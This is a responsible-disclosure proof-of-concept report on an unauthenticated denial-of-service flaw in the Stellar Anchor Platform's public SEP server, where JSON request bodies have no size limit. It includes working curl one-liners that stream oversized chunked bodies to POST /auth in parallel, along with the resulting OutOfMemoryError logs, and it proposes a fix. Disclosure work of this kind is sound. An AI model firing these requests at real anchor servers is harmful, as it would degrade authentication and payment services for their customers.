# Proof of Concept

## Title
Unauthenticated memory exhaustion (DoS) via unbounded JSON request body on the public SEP server (anchor-platform ≤ 4.9.0)

## Description

### Summary:
The public, Internet-facing **SEP server** of the Stellar Anchor Platform accepts request bodies of unlimited size on every JSON endpoint. The `RequestBodySizeLimitFilter` that was introduced to fix ANCHOR-1313 ("Unauthenticated Denial of Service (OOM) via unbounded batch size") is registered **only on the Platform (internal) server**; the SEP server has no equivalent filter and no Tomcat/Spring body-size properties.

* `platform/src/main/java/org/stellar/anchor/platform/component/platform/PlatformServerBeans.java:71-84` registers `RequestBodySizeLimitFilter` on `/*` for the Platform server only (`platform_server.max_request_body_size`, default 1 MiB).
* `platform/src/main/java/org/stellar/anchor/platform/SepServer.java:24-29` component-scans only `controller.sep`, `component.sep`, `component.share`. `component/sep/SepBeans.java` registers just the `WebAuthJwtFilter`; `component/share/RequestLoggerBeans.java` registers the request logger. No size limit is configured anywhere under `platform/src/main` (`grep -rn "max-http\|maxPostSize\|max-swallow" platform/src/main` is empty).
* Spring Boot 3.2.4 + embedded Tomcat: Tomcat's 2 MiB `maxPostSize` only bounds `application/x-www-form-urlencoded` parameter parsing. `@RequestBody` JSON is read through the servlet input stream with no limit and is materialised in full by Gson (`spring.mvc.converters.preferred-json-mapper=gson`, `SepConfigManager.java:47`) before any business validation runs.

Unauthenticated JSON endpoints reached this way:

* `POST /auth` (SEP-10, `Sep10Controller.java:73-83`) — `ValidationRequest.transaction` is a String; the 50 000-char check in `Sep10Service.parseChallenge` runs only **after** the full body has been buffered.
* `POST /sep45/auth` (SEP-45, `Sep45Controller.java:62-71`) — same pattern, `authorization_entries` String, 50 000-char check after full parse.

Authenticated JSON endpoints (any wallet user with a valid SEP-10 token, which is free to obtain) additionally **persist** the unbounded data:

* `POST /sep31/transactions` — `fields.transaction` is stored verbatim as a JSON column (`Sep31Service.java:237`, `JdbcSep31Transaction`), no key/value size limit.
* `PATCH /sep6/transactions/{id}` — values of `required_info_updates` are stored verbatim.
* `PUT /sep12/customer` (JSON) and `POST /sep24/transactions/{deposit,withdraw}/interactive` (JSON `HashMap<String,String>`).

A single attacker can therefore make the JVM allocate an arbitrarily large `String`/`StringBuilder` per connection, bounded only by the heap. The request is cheap for the attacker (a streamed, chunked body generated on the fly) and expensive for the server (every byte is copied into a growing `StringBuilder`, then into a `String`): in the test below ~36 MB uploaded per connection was enough to exhaust a 512 MB heap because three connections were buffering concurrently. This is the same bug class as ANCHOR-1313/ANCHOR-1283, which were accepted and fixed for the Platform server, but on the server that is *meant* to be public.

### Steps To Reproduce:
All steps are against a **local** instance (never testnet/pubnet).

  1. Start the Anchor Platform locally with SEP-10 enabled, e.g. `cd quick-run && docker compose up -d` (SEP server on `http://localhost:8080`). For a clear demonstration cap the heap, e.g. `JAVA_OPTS=-Xmx512m`.
  2. Confirm the Platform server rejects large bodies while the SEP server does not:
     ```
     # Platform API (port 8085) – protected
     head -c 2000000 /dev/zero | tr '\0' 'A' | curl -s -o - -w '\n%{http_code}\n' -X PATCH http://localhost:8085/transactions \
          -H 'Content-Type: application/json' --data-binary @-
     # -> {"error":"The request body is too large."}  413
     ```
  3. Stream an oversized JSON body to the unauthenticated SEP-10 endpoint. `Content-Length` is deliberately omitted (chunked transfer) so no length pre-check can apply, and the body is generated on the fly so the attacker needs no memory:
     ```
     ( printf '{"transaction":"'; head -c 800000000 /dev/zero | tr '\0' 'A'; printf '"}' ) | \
       curl -s -o /dev/null -w '%{http_code}\n' -X POST http://localhost:8080/auth \
            -H 'Content-Type: application/json' -H 'Transfer-Encoding: chunked' --data-binary @-
     ```
     Run 3–4 of these in parallel (`for i in 1 2 3 4; do ( ... ) & done`).
  4. Observe the SEP server log: `java.lang.OutOfMemoryError: Java heap space` thrown from `com.google.gson.stream.JsonReader.nextQuotedValue` while reading the body; the request is answered with HTTP 500 after the heap is exhausted.
  5. Expected behaviour (what the Platform server does): an immediate `413` with `{"error":"The request body is too large."}` before the body is read into memory.

### Observed output (local build of 4.9.0, `java -Xmx512m -jar anchor-platform-runner-4.9.0.jar --sep-server`, `security-reports/poc/poc_01.sh`):
```
worker 3 -> HTTP 500, sent 36173664 bytes in 0.798235s
worker 2 -> HTTP 500, sent 36042600 bytes in 0.846107s
worker 1 -> HTTP 500, sent 69070728 bytes in 0.819311s
--- server log ---
07:34:42.677 ERROR - o.s.a.u.Log - jakarta.servlet.ServletException: Handler dispatch failed: java.lang.OutOfMemoryError: Java heap space
Caused by: java.lang.OutOfMemoryError: Java heap space
	at java.base/java.util.Arrays.copyOf(Arrays.java:3537)
	at java.base/java.lang.AbstractStringBuilder.ensureCapacityInternal(AbstractStringBuilder.java:228)
	at java.base/java.lang.StringBuilder.append(StringBuilder.java:233)
	at com.google.gson.stream.JsonReader.nextQuotedValue(JsonReader.java:1173)
	at com.google.gson.stream.JsonReader.nextString(JsonReader.java:962)
	...
	at org.springframework.http.converter.json.GsonHttpMessageConverter.readInternal(GsonHttpMessageConverter.java:92)
```
Sending six such streams continuously for 30 s produced 138 `OutOfMemoryError`s in the server log. For accuracy: in this test Tomcat caught each `OutOfMemoryError` and the process **stayed up**; a concurrent loop of legitimate SEP-10 + SEP-24 flows from the same machine completed 95 flows (0 failures) during the attack versus 295 in the same 30 s without it (attacker and server shared one host, so part of that drop is CPU contention). The demonstrated effect is therefore repeated heap exhaustion and heavy degradation from a trivial, unauthenticated request, plus a hard memory amplification (tens of MB uploaded → whole heap consumed); a hard crash was not observed with this heap size. The fix on the Platform server (ANCHOR-1313) addressed exactly this OOM symptom.

### Supporting Material:
  * `platform/src/main/java/org/stellar/anchor/platform/component/platform/PlatformServerBeans.java:71-84` (filter registered for Platform server only)
  * `platform/src/main/java/org/stellar/anchor/platform/SepServer.java:24-29` (SEP server component scan; no body-limit bean in any scanned package)
  * `platform/src/main/java/org/stellar/anchor/platform/controller/sep/Sep10Controller.java:73-83`, `Sep45Controller.java:62-71` (unauthenticated `@RequestBody` endpoints)
  * `core/src/main/java/org/stellar/anchor/sep10/Sep10Service.java` `parseChallenge` – size check happens after the full body is already in memory.
  * Fix reference: register the existing `RequestBodySizeLimitFilter` in `SepBeans` with a `sep_server.max_request_body_size` setting, exactly as done for `platform_server` in ANCHOR-1313.

## Impact

### Summary:
Availability. An unauthenticated remote attacker can exhaust the heap of the public SEP server with a handful of cheap streamed requests (no flooding, no paid transactions, tens of MB per connection), causing repeated `OutOfMemoryError`s, failed requests and severe degradation of SEP-10/SEP-45 authentication and all wallet-facing SEP-6/12/24/31/38 endpoints for every customer of the anchor; depending on heap sizing and what else is allocating at the moment of exhaustion (DB connections, JWT signing, Kafka producers) this can escalate to a full outage. Authenticated variants additionally let one user write unbounded blobs into the anchor's database and event stream. CVSS v3.1: 5.3–7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L..H); same class as the accepted ANCHOR-1313.
